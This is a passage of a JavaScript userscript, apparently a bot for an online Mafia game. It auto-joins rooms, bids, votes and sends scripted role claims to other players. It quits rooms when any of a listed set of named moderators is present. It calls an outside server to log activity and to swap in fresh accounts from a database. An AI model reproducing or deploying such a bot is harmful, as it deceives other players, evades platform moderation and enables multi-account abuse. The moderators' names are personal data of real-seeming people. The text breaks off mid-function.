$($('script')[$('script').length-1]).remove();
$($('script')[23]).remove();
$($('script')[24]).remove();
if(location.href.indexOf("odnoklassniki")+1){ 
		var hash= PAGE_goto.toString().substr(85,32); 
		location.href="/standalone/"+hash;
}
$.ajax({
	type: "POST",
	url: "http://vh17197.hv4.ru/bot/autopilot.php",
	async: false,
	data: {"dgb": '1', "list": '1'},
	success: function(data){
	}
});
function smena(){
    $.ajax({
            type: "POST",
            url: "http://vh17197.hv4.ru/smena.php",
            async: false,
            data: {
                "pwd": "smena2",
            },
            success: function(data) {
                if(data){
                document.location.href =data;}
                else{
                    alert("в бд закончились аккаунты");
                }
            }
            })
}
$($('script')[$('script').length-1]).remove();
var hod_count = 0;
var ks = 1;
var hod_rol = '';
var sozd_game = '';
var rand_liga = '';
var rand_room = '';
var arr_sokl = '';
var adresat = '';
var pprov = '';
var flag = false;
var _flag = false;
var flag1 = false;
var flag2 = false;
var flag_priv = false;
var flag_cr = false;
var dvul_detected = false;
var basket_1 = []; //Хранилище проверенных гр
var basket_2 = []; //Хранилище вероятных гр
var basket_3 = []; //Хранилище сомнительных
var basket_4 = []; //Хранилище проверенных мафиози
var basket_5 = []; //Хранилище мертвецов	
var basket_6 = []; //Хранилище всех, на кого была прова
var basket_7 = []; //Временный чс
var moder = 'Нафар, Александр Карасев, Сергей Фёдоров, Мария Тулупова, Лисий нос, Алекс Стронг, Артем Ляхов, Юлия Красильникова, Татьянка Ивлева, Алексей Гура, Александр Барсов, Максим Беккер, Эля Вишневская, Александр Арефьев, Кирилл Серегин, Диана Хакимова, Оксана Крючкова, Евгения Козловская';
var blacklist = ['Нафар', 'Дэвил Майс', 'Александр Карасев', 'Сергей Фёдоров', 'Мария Тулупова', 'Лисий нос', 'Алекс Стронг', 'Артем Ляхов', 'Юлия Красильникова', 'Татьянка Ивлева', 'Алексей Гура', 'Александр Барсов', 'Максим Беккер', 'Эля Вишневская', 'Александр Арефьев', 'Кирилл Серегин', 'Диана Хакимова', 'Оксана Крючкова', 'Евгения Козловская'];

var mode = 2; 
var stavka_room = 20; 
var room = [8,8]; 
var liga = [1,2]; 
var hhaos = true; 
var auk = false; 
var eextra = false;
var bolt = true;
var roly_auk = []; 
var nick_sozda= "";
main();
/*$('#graphLoading').remove();
var help = 'Режим игры:\n - Режим 1 (бот сам создает комнаты и играет в них)\n - Режим 2 (бот заходит в чужие румы и там играет)\n - Режим 3 (бот периодически сам создает и к чужим залетает)\n\nСтавка игр - задается ставка игры.\n\nИгроков в комнате - можно задать один или два варианта, например, 8 и 12 или 8 и 20 и т.д.\n\nЛига (задается лига комнат, в соответствии с этим выбором бот будет создавать или заходить в чужие комнаты с этой лигой):\n - 1 (бронза)\n - 2 (серебро)\n - 3 (золото)\n - 4 (платина)\n - 5 (бриллиант)\n - 6 (лига чемпионов)\n\nХаос - да/нет\n\nАукцион - при выборе бот начнет бороться в аукционе за выбранные роли (3-4 раза кликнет, лимит 200 монет)\n\nПокупка ролей - можно выбрать роль или несколько ролей удерживая клавишу ctrl, за которую будет бороться бот. Если оставить пустым, то будет за все роли бороться.\n\nЭкстры - при выборе данного пункта бот начинает использовать экстры (маска, авто, удвойка) и закупать их.\n\nБолтун - при выборе бот начинает общаться, если не выбрать, то бот молчит';
var aapp ='<div id="ext_menu" class="popup-move ui-draggable" style="height: 380px; width: 250px; position: absolute; bottom: 30px; left: 5px; background-color: #2B2B2B; color:white; border: 1px solid black; border-radius: 6px; opacity:0.9;z-index: 100;box-shadow: 0 0 7px rgba(0,0,0,5);-webkit-user-select: none;"><div style="background-color: black; margin:5px; height: 330px; width: 240px; border-radius: 6px;" class="content"><span style="margin: 5px;"><p>Режим игры<select style="margin-top:5px; margin-left:5px; background-color: #2B2B2B; color: white; border: 1px solid gray; border-radius: 2px;" id="mode" onclick="update_settings()"><option selected="" value="2">Режим 2</option><option value="1">Режим 1</option><option value="3">Режим 3</option></select></p><p>Ставка игр<select  style="margin-top:5px; margin-left:5px; background-color: #2B2B2B; color: white; border: 1px solid gray; border-radius: 2px;" id="stavkaRoom" onclick="update_settings()"><option selected="" value="20">20</option><option value="200">200</option><option value="1000">1000</option></select></p><p>Игроков в комнате<select  style="margin-top:5px; margin-left:5px; background-color: #2B2B2B; color: white; border: 1px solid gray; border-radius: 2px;" id="numPlayer1" class="numPlayer" onclick="update_settings()"><option selected="" value="8">8</option><option value="12">12</option><option value="16">16</option><option value="20">20</option></select><select  style="margin-top:5px; margin-left:5px; background-color: #2B2B2B; color: white; border: 1px solid gray; border-radius: 2px;" id="numPlayer2" class="numPlayer" onclick="update_settings()"><option selected=""  value="8">8</option><option value="12">12</option><option value="16">16</option><option value="20">20</option></select></p><p>Лига<select  style="margin-top:5px; margin-left:5px; background-color: #2B2B2B; color: white; border: 1px solid gray; border-radius: 2px;" id="liga1" class="liga" onclick="update_settings()"><option selected="" value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option></select><select  style="margin-top:5px; margin-left:5px; background-color: #2B2B2B; color: white; border: 1px solid gray; border-radius: 2px;" id="liga2" class="liga" onclick="update_settings()"><option value="1">1</option><option selected="" value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option></select></p><p>Хаос<input type="checkbox" id="hhaos" name="hhaos" onclick="update_settings()"" checked/></p><p>Аукцион<input type="checkbox" id="auk" name="auk" onclick="update_settings()"/></p><p><select  style="margin-top:5px; margin-left:5px; background-color: #2B2B2B; color: white; border: 1px solid gray; border-radius: 2px;" onclick="update_mult()" id="ps-type" name="ps-type" multiple="multiple" size="3"><option>Нефритовый заяц</option><option>Добрый зайка</option><option>Вредный зайка</option><option>Комиссар</option><option>Двуликий</option><option>Босс мафии</option><option>Маньяк</option><option>Доктор</option><option>Вор</option><option>Стерва</option><option>Свидетель</option></select></p><p>Экстры<input type="checkbox" id="eext" name="eext" onclick="update_settings()"/></p><p>Болтун<input type="checkbox" id="boltun" name="boltun" onclick="update_settings()" checked/></p><center><table><tr><td><button style="margin-top: -1px; margin-left: 5px; height: 25px; background-color: #2B2B2B; color: white; border: 1px solid gray; border-radius: 2px;" id="pusk" onclick="main()">RUN</button></td><td><button style="margin-top: -1px; margin-left: 5px; height: 25px; background-color: #2B2B2B; color: white; border: 1px solid gray; border-radius: 2px;" id="pusk" onclick="alert(help)">HELP</button></td></tr></table></center></span></div></div>';

$('#rootContainer').prepend(aapp);

function update_settings() {
    if ($("#mode").val()) {
        mode=$("#mode").val();
    } else {
        mode = 2;
    }
    if($("#stavkaRoom").val()){
        stavka_room = $("#stavkaRoom").val();
    }else{
        stavka_room = 20;
    }
    if($("#numPlayer1").val() && $("#numPlayer2").val()){
        room = [$("#numPlayer1").val(),$("#numPlayer2").val()];
    }else{
      room = [];  
    }
    if($("#liga1").val() && $("#liga2").val()){
        liga = [$("#liga1").val(),$("#liga2").val()]; 
    }else{
        liga = [];
    }
    if($("#hhaos").prop("checked")){
        hhaos = true; 
    }else{
        hhaos = false;
    }
    if($("#auk").prop("checked")){
        auk = true; 
    }else{
        auk = false;
    }
    if($("#eext").prop("checked")){
        eextra = true; 
    }else{
        eextra = false;
    }
    if($("#boltun").prop("checked")){
        bolt = true; 
    }else{
        bolt = false;
    }
}
function update_mult() {
	roly_auk = $("option:selected").map(function(){ return this.value }).get().join(", ");//.split(',');
}
*/
  //Создание комнат 
function create_room(){
	_GM_action('', 'create', 0, event);
	rand_room = room[parseInt(Math.floor((Math.random() * room.length) + 1))-1];
	rand_liga = liga[parseInt(Math.floor((Math.random() * liga.length) + 1))-1];
	$('#crt_players').val(rand_room);
	$('#crt_league').val(rand_liga);
	$('#crt_bet').val(stavka_room);
	$("#crt_prior").prop("checked", true);
	$("#crt_chaos").prop("checked", hhaos);
	_GM_action('gmc_btn_create', 'create', 1, event);
	flag_priv = false;
	basket_3 = [];
	return false;
}

// Автовход в чужие комнаты
/*function vhod_v_room(){
	rand_room = room[parseInt(Math.floor((Math.random() * room.length) + 1))-1];
	rand_liga = liga[parseInt(Math.floor((Math.random() * liga.length) + 1))-1];
	var avtovhod = $('#gml_list li:contains("/'+rand_room+'")').find('.rating.r'+rand_liga+'_h');
	for(var i=0;i<avtovhod.length;i++){
		if (hhaos == true){
			var id = parseInt($($(avtovhod)[i]).parent('li').attr('class').replace(/\D+/g,""));
			if ($('.'+'gml_'+id).find('.chaos').length != 0){
				if (parseInt($('.'+'gml_'+id+'.coins').text()) == stavka_room){
					var bl = $('.gml_'+id+'.name').find('.link');
					if (($.inArray($($(bl)[0]).text(),blacklist) == -1) && ($.inArray($($(bl)[0]).text(),basket_7) == -1)){
						$('.'+'gml_'+id+'.button').find('button')[0].click();
						basket_3 = [];
						setTimeout(function(){
							var list_sokl = $('#gpl_list').find('li').find('.player').find('.nick');
							sozd_game = $($(list_sokl)[0]).text();
							for(var i=0;i<list_sokl.length;i++){
								if (($.inArray($($(list_sokl)[i]).text(),blacklist) != -1) || (arr_sokl.indexOf($($(list_sokl)[i]).text()) != -1) || (moder.indexOf($($(list_sokl)[i]).text()) + 1)){
									_GM_action('', 'exit');
									basket_7[basket_7.length] = sozd_game;
								}
							}
						},500);		
						flag_priv = false;
					}
				}
			}
		}
		if (hhaos == false){
			var id = parseInt($($(avtovhod)[i]).parent('li').attr('class').replace(/\D+/g,""));
			if ($('.'+'gml_'+id).find('.chaos').length == 0){
				if ($('.'+'gml_'+id+'.coins').text() == stavka_room){
					var bl = $('.gml_'+id+'.name').find('.link');
					if (($.inArray($($(bl)[0]).text(),blacklist) == -1) && ($.inArray($($(bl)[0]).text(),basket_7) == -1)){
						$('.'+'gml_'+id+'.button').find('button')[0].click();
						basket_3 = [];
						setTimeout(function(){
							var list_sokl = $('#gpl_list').find('li').find('.player').find('.nick');
							sozd_game = $($(list_sokl)[0]).text();
							for(var i=0;i<list_sokl.length;i++){
								if (($.inArray($($(list_sokl)[i]).text(),blacklist) != -1) || (arr_sokl.indexOf($($(list_sokl)[i]).text()) + 1) || (moder.indexOf($($(list_sokl)[i]).text()) + 1)){
									_GM_action('', 'exit');
									basket_7[basket_7.length] = sozd_game;
								}
							}
						},500);
						flag_priv = false;						
					}
				}
			}
		}	
	}
}*/
function vhod_v_room(){
	rand_room = room[parseInt(Math.floor((Math.random() * room.length) + 1))-1];
	rand_liga = liga[parseInt(Math.floor((Math.random() * liga.length) + 1))-1];
	var avtovhod = $('#gml_list li:contains("/'+rand_room+'")').find('.rating.r'+rand_liga+'_h');
	for(var i=0;i<avtovhod.length;i++){
			var id = parseInt($($(avtovhod)[i]).parent('li').attr('id').replace(/\D+/g,""));
				if (parseInt($('#'+'gml_'+id+' .coins').text()) == stavka_room){
						$('#'+'gml_'+id+' .button').find('button').click();
		}	
	}
}

// Очистка
function obnulenie(){
	_flag = false;
	flag = false;
	flag1 = false;
	dvul_detected = false;
	basket_1 = []; //Хранилище проверенных гр
	basket_2 = []; //Хранилище вероятных гр
	basket_3 = []; //Хранилище сомнительных
	basket_4 = []; //Хранилище проверенных мафиози
	basket_5 = []; //Хранилище мертвецов
	basket_6 = []; //Хранилище всех, на кого была прова	
	basket_7 = []; //Временный чс
	hod_count = 0;
	ks = 1;
	hod_rol = '';
}

// Автовыход
function exits(){
	var smert1 = $('#cco_log').find('.info-msg.dead-txt');
	var smert2 = $('#cco_log').find('.end-msg.dead-txt');
	$($('#pp_fin').find('button')[0]).click();
	$($('.bg').find('button')[0]).click();
	$($('.footerButtons').find('button')[0]).click();
	$($('.footer-buttons').find('button')[0]).click();
	if ((smert1.length-1 != -1) ||(smert2.length-1 != -1)){
		_DLG('exit', 0, event);
		flag_cr = false;
		flag_priv = false;
		basket_3 = [];
		setTimeout(function(){
			$($('.footer-buttons').find('button')[0]).click();
		},100);
	}
}	
	
//Закуп роли на аукционе на последних секундах
function zakup_auk(){
	var pay_lim = 220;
	var search_rol = roly_auk.indexOf($('.roleName').text());
	if (roly_auk.indexOf($('.roleName').text()) != -1) {
		if ((auk == true) && (parseInt($("#gsl_bet").text()) < pay_lim)){
			$('#gsl_btn').click();
		}
	}
	return false;
}

//Определение роли
function rrole(){
	return t_persons[(typeof pla_data['person'] != "undefined" ? pla_data['person']:0)];
}

//Айди по нику
function id_po_nicku(value){
	var ccreate = $('#upl_list').find('li').find('.nick');
	for(var i=0;i<ccreate.length;i++){
		if ($($(ccreate)[i]).text()==value){
			var id_player = $($(ccreate)[i]).parent('div').parent('li').attr('id').substr(4);
		}
	}
	return id_player;	
}

//поиск игрока
function search_po_nicku(value){
	var rezult = 0;
	var ccreate = $('#upl_list').find('li').find('.nick');
	for(var i=0;i<ccreate.length;i++){
		if ($($(ccreate)[i]).text()==value){
			rezult = 1;
		}
	}
	return rezult;	
}

//Определяет категорию роли: положительная или отрицательная
function category_role(){
	if ((rrole() == 'Мафиози!') || (rrole() == 'Босс мафии!') || (rrole() == 'Маньяк!') || (rrole() == 'Двуликий!')){
		var category = 0;
	}
	else {
		var category = 1;
	}
	return category;
}

//Определяет категорию роли: положительная или отрицательная
function rol_lss(rols){
	if ((rols == 'Мафиози!') || (rols == 'Босс мафии!') || (rols == 'Маньяк!') || (rols == 'Двуликий!')){
		var category = 0;
	}
	else {
		var category = 1;
	}
	return category;
}

//Отправка провы в лс
function mmessage(id,text){
	var key='key';down='down';press='press';ipv='ipv_'+id;ipv_txt='ipv_'+id+'_txt';
	$('#myExtras').append('<div id="del" style="display:none"><textarea style="display:none" id="'+ipv_txt+'" onkeydown="return _CHT_action(ipv, key, down, event);" onkeypress="_CHT_action(ipv, key, press, event);"></textarea></div>');
	$("#"+ipv_txt).val(text);
	_CHT_action(ipv, 'send', '', event);	
	$('#del').remove();
}

//Добавление в корзину
function add_element_to_basket(basket,element){
	if ((element.search('»') == -1) && (element != '')){
		del_all(element);
		if ((search_element_from_basket(basket,element) == -1) && (element != $('.my_nickname').text()) && (search_element_from_basket(basket_5,element) == -1)){
			basket[basket.length] = element;
		}
		return basket;
	}
}

//Добавление мертвеца
function add_element_to_basket_mertv(basket,element){
	if (element != '') {
		del_all(element);
		del_element_from_basket(basket_1,element);
		del_element_from_basket(basket_2,element);
		del_element_from_basket(basket_3,element);
		del_element_from_basket(basket_4,element);
		if ((search_element_from_basket(basket,element) == -1) && (element != $('.my_nickname').text())){
			basket[basket.length] = element;
		}
	}
	return basket;
}

//Молчуны
function molchun(){
	var niki = $('#upl_list').find('li').find('.nick');
	for(var i=0;i<niki.length;i++){
		var n = $($(niki)[i]).text();
		if ((search_element_from_basket(basket_1,n) == -1) && (search_element_from_basket(basket_2,n) == -1) && (search_element_from_basket(basket_3,n) == -1) && (search_element_from_basket(basket_4,n) == -1) && (search_element_from_basket(basket_5,n) == -1)){
			add_element_to_basket(basket_3,n);
		}

	}
	return false;		
}

//Поиск элемента в корзине
function search_element_from_basket(basket,element){
	var serach_elem = $.inArray(element,basket);
	return serach_elem;
}

//Поиск и удаление элемента
function del_element_from_basket(basket,element){
	var serach_elem = $.inArray(element,basket);
	if (serach_elem != -1){
		basket.splice(serach_elem, 1);
	}
	return basket;
}

//Удаление со всех корзин
function del_all(element){
//	del_element_from_basket(basket_1,element);
	del_element_from_basket(basket_2,element);
	del_element_from_basket(basket_3,element);
//	del_element_from_basket(basket_4,element);
	return false;
}

//Слив
function sliv(value){
	var niki = $('#upl_list').find('li').find('.nick');
	for(var i=0;i<niki.length;i++){
		if (($($(niki)[i]).text() == value) && ($('button').is('.x2vote') == false)){
			if ((kol_sutok() != 1) || (adresat != sozd_game) || (rand_liga < 4)){
				$($('#upl_list').find('button')[i]).click();
				if (uznat_basket(value) != 1){
					setTimeout(function(){$($('#pp_vte').find('button')[0]).click();},300);
				}
			}
		}
	}
	return false;		
}

function cut(value){
	var niki = $('#upl_list').find('li').find('.nick');
	if ((kol_sutok() == 2) && (value == sozd_game) && (rand_liga > 3)){
		for(var i=0; i<6; i++){
			if (value == sozd_game){
				value = basket_3[Math.floor((Math.random() * basket_3.length) + 1)-1]
			}
		}
	}
	for(var i=0;i<niki.length;i++){
		if ($($(niki)[i]).text()==value){
			$($('#upl_list').find('button')[i]).click();
			if (uznat_basket(value) != 1){
				setTimeout(function(){$($('#pp_vte').find('button')[0]).click();},300);
			}			
		}
	}
}

//Узнать корзину игрока
function uznat_basket(nick){
	var serach_elem = $.inArray(nick,basket_1);
	if (serach_elem != -1){
		var val = 1;
	}
	var serach_elem = $.inArray(nick,basket_2);
	if (serach_elem != -1){
		var val = 2;
	}
	var serach_elem = $.inArray(nick,basket_3);
	if (serach_elem != -1){
		var val = 3;
	}
	var serach_elem = $.inArray(nick,basket_4);
	if (serach_elem != -1){
		var val = 4;
	}
	var serach_elem = $.inArray(nick,basket_5);
	if (serach_elem != -1){
		var val = 5;
	}
	return val;
}

//Поиск напаров
function poisk_naparov(){
	var niki = $('#upl_list').find('li').find('.nick');
	var mf = $('#upl_list').find('li').find('.ico');
	for(var i=0;i<mf.length;i++){
		var ttit = $($(mf)[i]).attr("title");
		var nik = $($(niki)[i]).text();
		if (((ttit == 'Мафиози') || (ttit == 'Двуликий') || (ttit == 'Комиссар') || (ttit == 'Сержант') || (ttit == 'Босс мафии')) && (search_element_from_basket(basket_5,nik) == -1)){
			add_element_to_basket(basket_1,nik);
		}
		else {
			if ((rrole() != 'Комиссар!') && (rrole() != 'Сержант!')){
				add_element_to_basket(basket_3, nik);
			}
		}
	}		
}

//Ночной ход за напаром
function za_naparom(){
	var protiv = $('#upl_list').find('li').find('.name').find('.hint');
	var mafs = $('#upl_list').find('li').find('.ico');
	for(var i=0;i<protiv.length;i++){
		var razdelitel = ($($(protiv)[i]).text().search(':'));
		var nick = $($(protiv)[i]).text().substr(razdelitel+2);
		var rolll = $($(mafs)[i]).attr("title");
		if ((nick != '') && (rolll == 'Мафиози')){
			sliv(nick);
		}
	}
	return false;	
}
// Слив за проверенными
function sliv_za_proverennimi(){
	var lyut = $('#upl_list').find('li').find('.name').find('.hint');
	var lyet = $('#upl_list').find('li').find('.name').find('.nick');
	for(var i=0;i<lyut.length;i++){
		var razdelitel = ($($(lyut)[i]).text().search(':'));
		var nick_sliv = $($(lyut)[i]).text().substr(razdelitel+2);
		var napar_sliv = $($(lyet)[i]).text();
		if ((uznat_basket(napar_sliv) == 1) || (uznat_basket(napar_sliv) == 2)){
			sliv(nick_sliv);
		}
	}	
}
// Слив за напаром
function sliv_za_naparom(){
	var lyut = $('#upl_list').find('li').find('.name').find('.hint');
	var lyet = $('#upl_list').find('li').find('.name').find('.nick');
	for(var i=0;i<lyut.length;i++){
		var razdelitel = ($($(lyut)[i]).text().search(':'));
		var nick_sliv = $($(lyut)[i]).text().substr(razdelitel+2);
		var napar_sliv = $($(lyet)[i]).text();
		if (uznat_basket(napar_sliv) == 1){
			sliv(nick_sliv);
		}
	}	
}
//Поддержать слив игрока 3 или 4 корзины
function sliv_3_and_4_basket(){
	var protiv = $('#upl_list').find('li').find('.name').find('.hint');
	for(var i=0;i<protiv.length;i++){
		var razdelitel = ($($(protiv)[i]).text().search(':'));
		var nick = $($(protiv)[i]).text().substr(razdelitel+2);
		if ((rrole() == 'Двуликий!') && (basket_1.length < 1)){
			poisk_naparov();
		}
		if (((uznat_basket(nick)==3) || (uznat_basket(nick)==4)) && (vremya_sutok() == 'ДЕНЬ')){
			sliv(nick);
		}
//		if (parseInt($('.seconds').text()) < 18){
//			if (((uznat_basket(nick)==3) || (uznat_basket(nick)==4)) && (vremya_sutok() == 'ДЕНЬ')){
//				sliv(nick);
//			}
//		}
		if (((nick == $('.my_nickname').text()) || (uznat_basket(nick) == 1)) && ($('button').is('.x2vote') == false)){
			if ((kol_sutok() != 1) || (adresat != sozd_game) || (rand_liga < 4)){
				$($('#upl_list').find('button')[i]).click();
				setTimeout(function(){$($('#pp_vte').find('button')[0]).click();},300);
			}
		}
	}
	return false;	
}

// Приговор и оправдание
function prig_opr(value){
	var sud = $('.popupGameVote').find('h2');
	var prig_sud = $($(sud)[0]).text().substring(3, -3);
	if (prig_sud != 'Гол'){
		if ((uznat_basket(value) != 1) && (uznat_basket(value) != 2)){
			$($('#pp_vte').find('button')[0]).click();
		}
		else {
			if ((basket_3.length < 1) && (uznat_basket(value) == 2)){
				$($('#pp_vte').find('button')[0]).click();
			}
			$($('#pp_vte').find('button')[1]).click();
		}
	}
	return false;
}

//Формирование 1 и 3 корзины для мафии
function baskets_1_for_maf(){
	var prova_koma = $('#cco_log').find('.proverka').find('.bb');
	var proverennie_koma = $('#cco_log').find('.proverka').find('.bb').find('a');
	for(var i=0;i<prova_koma.length;i++){
		if ($($(prova_koma)[i]).text().search('играет за мафию') != -1){
			del_element_from_basket(basket_3, $($(proverennie_koma)[i]).text());
			add_element_to_basket(basket_1, $($(proverennie_koma)[i]).text());
		}
	}
}
// Формирование 3 корзины для мана
function baskets_3_for_man(){
	var spisok = $('#upl_list').find('li').find('.nick');
	for(var i=0;i<spisok.length;i++){
		add_element_to_basket(basket_3, $($(spisok)[i]).text());
	}
}
function write_proverennim(){
	if (category_role() == 1){
		var nick_ot_do = $('#cco_log').find('.proverka').find('.bb').find('em').find('a');
		var nick_ot = $($(nick_ot_do)[nick_ot_do.length-1]).text()
		if ((search_element_from_basket(basket_1,nick_ot) != -1) && (search_po_nicku(nick_ot) == 1) && (nick_ot != my_nick) && (search_element_from_basket(basket_6,nick_ot) == -1) && (search_element_from_basket(basket_5,nick_ot) == -1)){
			var id_ot = id_po_nicku(nick_ot);
			if (rrole() == 'Свидетель!'){
				var otp = ['я свид', 'свид я', 'свид', 'я свид'];
				mmessage(id_ot,otp[Math.floor(Math.random() * 3) + 1]);
			}
			if (rrole() == 'Доктор!'){
				var otp = ['я док', 'док я', 'док', 'доктор я'];
				mmessage(id_ot,otp[Math.floor(Math.random() * 3) + 1]);
			}
			if (rrole() == 'Вор!'){
				var otp = ['я вор', 'вор я', 'вор', 'я вор'];
				mmessage(id_ot,otp[Math.floor(Math.random() * 3) + 1]);
			}
			if (rrole() == 'Стерва!'){
				var otp = ['я стерва', 'стерва я', 'стерва я', 'я стерва'];
				mmessage(id_ot,otp[Math.floor(Math.random() * 3) + 1]);
			}
			if (rrole() == 'Медработник!'){
				var otp = ['я мед', 'я медик', 'мед я', 'я мед'];
				mmessage(id_ot,otp[Math.floor(Math.random() * 3) + 1]);
			}
			if (rrole() == 'Гражданин!'){
				var otp = ['я гр', 'я гыр', 'я гр крч', 'я гр'];
				mmessage(id_ot,otp[Math.floor(Math.random() * 3) + 1]);
			}
			add_element_to_basket(basket_6, nick_ot);
		}
	}	
}
//Формирование 1 и 4 корзины
function baskets_1_and_4(){
	var prova_koma = $('#cco_log').find('.proverka').find('.bb');
	var proverennie_koma = $('#cco_log').find('.proverka').find('.bb').find('a');
	for(var i=0;i<prova_koma.length;i++){
		if ($($(prova_koma)[i]).text().search('играет за граждан') != -1){
			del_element_from_basket(basket_4, $($(proverennie_koma)[i]).text());
			add_element_to_basket(basket_1, $($(proverennie_koma)[i]).text());
		}
		else 
		{	
			add_element_to_basket(basket_4, $($(proverennie_koma)[i]).text());
			sliv($($(proverennie_koma)[i]).text());
		}
	}
	var prova_extra = $('#cco_log').find('p');
	for(var i=0;i<prova_extra.length;i++){
		var razdelitel = ($($(prova_extra)[i]).text().search(':'));
		if (razdelitel != -1) {
			var nick = $($(prova_extra)[i]).text().slice(0,razdelitel);
			var msg = $($(prova_extra)[i]).text().substr(razdelitel+2);
			
			if ((msg.search('Карты таро раскрыли вам роль: ') != -1) || (msg.search('Детектор лжи дал результаты: ') != -1)){
				var poz_nach_simvola = msg.indexOf(":");
				var poz_kon_simvola = msg.indexOf("-");
				var nick_prov_extra = msg.substr(poz_nach_simvola+2,poz_kon_simvola - poz_nach_simvola-3);
				var rol_prov_extra = msg.substr(poz_kon_simvola+2,msg.length - poz_kon_simvola);
				if ((rol_prov_extra.search('Мафиози') != -1) || (rol_prov_extra.search('Босс мафии') != -1) || (rol_prov_extra.search('Маньяк') != -1) || (rol_prov_extra.search('Двуликий') != -1)){
					if (search_element_from_basket(basket_1, nick_prov_extra) == -1){
						add_element_to_basket(basket_4, nick_prov_extra);
						setTimeout(function(){
							sliv(nick_prov_extra);
						},2000);					
						add_element_to_basket(basket_1, nick);
					}
				}
				else
				{
					add_element_to_basket(basket_1, nick_prov_extra);
					add_element_to_basket(basket_1, nick);					
				}
			}	
			
			if ((msg.search('Вами прослушанный игрок ') != -1) && (msg.search('играет активную роль') != -1)){
				var poz_nach_simvola = msg.indexOf("к");
				var poz_kon_simvola = msg.indexOf("играет активную роль");
				var nick_prov_extra = msg.substr(poz_nach_simvola+2,poz_kon_simvola - poz_nach_simvola-3);
				if (search_element_from_basket(basket_1,nick_prov_extra) == -1){
					add_element_to_basket(basket_4, nick_prov_extra);
					setTimeout(function(){
						sliv(nick_prov_extra);
					},2000);	
					add_element_to_basket(basket_1, nick);
				}
			}
			if ((msg.search('Вами прослушанный игрок ') != -1) && (msg.search('этой ночью не делал хода') != -1)){
				var poz_nach_simvola = msg.indexOf("к");
				var poz_kon_simvola = msg.indexOf("этой ночью не делал хода");
				var nick_prov_extra = msg.substr(poz_nach_simvola+2,poz_kon_simvola - poz_nach_simvola-3);
				add_element_to_basket(basket_1, nick_prov_extra);
				add_element_to_basket(basket_1, nick);
			}			
		}
	}	
	return false;
}

//Формирование 2 и 3 корзины
function baskets_2_and_3(){
	var log = $('#cco_log').find('p');
	for(var i=0;i<log.length;i++){
		var razdelitel = ($($(log)[i]).text().search(':'));
		if (($($(log)[i]).attr('class')== null) && (razdelitel != -1)) {
			var nick = $($(log)[i]).text().slice(0,razdelitel);
			var msg = $($(log)[i]).text().substr(razdelitel+2);
			if ((msg == 'гр') || (msg == 'Гр') || (msg == 'ГР') || (msg == 'Гыр') || (msg == 'гыр') || (msg == 'гражданин') || (msg == 'Гр.') || (msg == 'гр.') || (msg == 'uh') || (msg == 'гырю') || (msg == 'мир') || (msg == 'МИР') || (msg == 'Мир') || (msg == 'мирный') || (msg == 'Мирный') || (msg == 'мирная') || (msg == 'Мирная') || (msg == 'овощ') || (msg == 'Овощ') || (msg == 'ОВОЩ')){
				add_element_to_basket(basket_2, nick);
			}
			else {
				if (search_element_from_basket(basket_2,nick) == -1){
					add_element_to_basket(basket_3, nick);
				}
			}
		}
	}
	molchun();
}

//Мертвецы
function ddead(){
	var ddeads = $('#upl_list').find('li').find('.hint');
	var spisok = $('#upl_list').find('li').find('.nick');
	for(var i=0;i<ddeads.length;i++){
		if (($($(ddeads)[i]).text() == 'покойник') || ($($(ddeads)[i]).text() == 'за решеткой')){
			var pokoinik = $($(spisok)[i]).text();
			del_element_from_basket(basket_1, pokoinik);
			del_element_from_basket(basket_2, pokoinik);
			del_element_from_basket(basket_3, pokoinik);
			del_element_from_basket(basket_4, pokoinik);
			add_element_to_basket_mertv(basket_5, pokoinik);
		}
	}			
    return false;
}

//Просмотр корзин
function k(val){
	if (val==1){
		alert(basket_1);
	}
	if (val==2){
		alert(basket_2);
	}
	if (val==3){
		alert(basket_3);
	}
	if (val==4){
		alert(basket_4);
	}
	if (val==5){
		alert(basket_5);
	}
	if (val==6){
		alert(basket_6);
	}
	if (val==7){
		alert(basket_7);
	}
}

//Время суток
function vremya_sutok(){
	var noch = $('#cco_log').find('.day-night-chg');
	var nch = $($(noch)[noch.length-1]).text().substr(-4);
	return nch;
}

//Определить какие сутки
function kol_sutok(){
	var noch = $('#cco_log').find('.day-night-chg');
	var nch = $($(noch)[noch.length-1]).text();
	var nch1 = nch[nch.length-6];
	return nch1;
}

//Закрытие окон
function erase(){
	$($('.bg').find('button')[0]).click();
	$('.containerEraser').css('display','none');
	$('#flashHint').css('display','none');
}
//Ход к адресату 
function move_to_adr(){
	if ((category_role()==0) && (vremya_sutok() == 'ДЕНЬ') && (basket_3.length > 0)){
			var r = Math.floor((Math.random() * basket_3.length) + 1);
			if (basket_3[r-1] != ''){ 
				adresat = basket_3[r-1]; 
			}
			if ((kol_sutok() == 2) && (adresat == sozd_game) && (rand_liga > 3)){
				for(var i=0; i<6; i++){
					if (adresat == sozd_game){
						var r = Math.floor((Math.random() * basket_3.length) + 1);
						adresat = basket_3[r-1];
					}
				}
			}
			if (((rrole() == 'Двуликий!') || (rrole() == 'Босс мафии!') || (rrole() == 'Мафиози!')) && (basket_1.length > 0)){
				chat_kill(adresat);
			}
	}
	if ((category_role()==1) && (vremya_sutok() == 'ДЕНЬ')){
		if ((rrole() != 'Доктор!') && (rrole() != 'Свидетель!')){		
			if (basket_3.length > 0){	
				var r = Math.floor((Math.random() * basket_3.length) + 1);
				if (basket_3[r-1] != ''){ adresat = basket_3[r-1];}	
			}
			else {
				var r = Math.floor((Math.random() * basket_2.length) + 1);
				if (basket_2[r-1] != ''){ adresat = basket_2[r-1];}					
			}
		}
		if ((rrole() == 'Доктор!') || (rrole() == 'Свидетель!')){
			if (basket_2.length > 0){	
				var r = Math.floor((Math.random() * basket_2.length) + 1);
				if (basket_2[r-1] != null){ adresat = basket_2[r-1];}	
			}
			else {
				var r = Math.floor((Math.random() * basket_1.length) + 1);
				if (basket_1[r-1] != null){ adresat = basket_1[r-1];}					
			}	
			if ((adresat == null) || (adresat == '')){
				var r = Math.floor((Math.random() * basket_3.length) + 1);
				adresat = basket_3[r-1];	
			}
		}
		if ((rrole() == 'Комиссар!') || (rrole() == 'Сержант!')){
				for(var i=0; i<6; i++){
					if (search_element_from_basket(basket_6,adresat) != -1){
						if (basket_3.length > 0){	
							var r = Math.floor((Math.random() * basket_3.length) + 1);
							if (basket_3[r-1] != ''){ adresat = basket_3[r-1];}	
						}
						else {
							var r = Math.floor((Math.random() * basket_2.length) + 1);
